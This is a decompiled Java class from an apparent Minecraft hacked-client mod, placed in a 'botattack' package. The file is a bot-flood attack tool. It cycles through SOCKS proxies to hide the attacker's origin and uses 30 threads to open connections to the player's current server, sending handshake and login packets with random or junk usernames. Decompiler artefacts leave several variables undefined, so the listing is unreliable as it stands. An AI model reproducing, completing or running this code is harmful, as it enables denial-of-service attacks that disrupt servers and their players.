// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.botattack;

import java.lang.reflect.Method;
import java.lang.reflect.Field;
import java.net.Proxy;
import net.minecraft.client.multiplayer.ServerData;
import java.io.DataOutputStream;
import java.net.SocketAddress;
import java.net.InetSocketAddress;
import java.net.SocketImpl;
import java.net.Socket;
import java.net.InetAddress;
import net.minecraft.client.multiplayer.ServerAddress;
import net.minecraft.client.Minecraft;
import java.util.concurrent.Executors;
import java.util.Random;
import java.util.concurrent.ExecutorService;

public class BotCrackedConnector
{
    private static final int threadAmount = 30;
    public static ExecutorService executor;
    private static final ProxyManager proxyManager;
    private Random random;
    
    static {
        proxyManager = new ProxyManager();
    }
    
    public BotCrackedConnector() {
        this.random = new Random();
    }
    
    public static void start() {
        BotCrackedConnector.executor = Executors.newFixedThreadPool(30);
        try {
            final ServerData serverData = Minecraft.getMinecraft().getCurrentServerData();
            if (serverData == null) {
                return;
            }
            final ServerAddress serveradress = ServerAddress.resolveAddress(serverData.serverIP);
            final String[] addressPort = (String.valueOf(InetAddress.getByName(serveradress.getIP()).getHostAddress()) + " " + serveradress.getPort()).split(" ");
            final Random random = new Random();
            new Thread(() -> {
                while (!BotCrackedConnector.executor.isShutdown()) {
                    final Proxy proxy = BotCrackedConnector.proxyManager.nextProxy();
                    try {
                        final Socket socket = new Socket(proxy);
                        if (BotCrackedConnector.proxyManager.getSocksType(proxy) == ProxyManager.SocksType.SOCKS4) {
                            final Class<? extends Socket> clazzSocks = socket.getClass();
                            final Field sockImplField = clazzSocks.getDeclaredField("impl");
                            sockImplField.setAccessible(true);
                            final SocketImpl socksimpl = (SocketImpl)sockImplField.get(socket);
                            final Class<? extends SocketImpl> clazzSocksImpl = socksimpl.getClass();
                            final Method setSockVersion = clazzSocksImpl.getDeclaredMethod("setV4", (Class<?>[])new Class[0]);
                            setSockVersion.setAccessible(true);
                            setSockVersion.invoke(socksimpl, new Object[0]);
                            sockImplField.set(socket, socksimpl);
                        }
                        BotCrackedConnector.executor.execute(() -> {
                            try {
                                socket2.connect(new InetSocketAddress(array[0], Integer.parseInt(array[1])));
                                final DataOutputStream out = new DataOutputStream(socket2.getOutputStream());
                                PacketUtils.sendPacketException(PacketUtils.createHandshakeMessage(array[0], Integer.parseInt(array[1]), 2), out);
                                if (random2.nextBoolean()) {
                                    PacketUtils.sendPacketException(PacketUtils.createLogin(new StringBuilder().append(random2.nextInt(9999)).toString()), out);
                                }
                                else if (random2.nextBoolean()) {
                                    PacketUtils.sendPacketException(PacketUtils.createLogin("abcdefghijklmnopqrstuvwxyz123456789"), out);
                                }
                                else if (random2.nextBoolean()) {
                                    PacketUtils.sendPacketException(PacketUtils.createLogin("abcdefghijklmnopqrstuvwxyz123456789abcdefghijklmnopqrstuvwxyz123456789"), out);
                                }
                                else if (random2.nextBoolean()) {
                                    PacketUtils.sendPacketException(PacketUtils.createLogin(InetAddress.getByName(serverAddress.getIP()).getHostAddress()), out);
                                }
                                Thread.sleep(10L);
                            }
                            catch (final Exception ex2) {}
                            return;
                        });
                        Thread.sleep(10L);
                    }
                    catch (final Exception ex) {}
                }
            }).start();
        }
        catch (final Throwable t) {}
    }
}
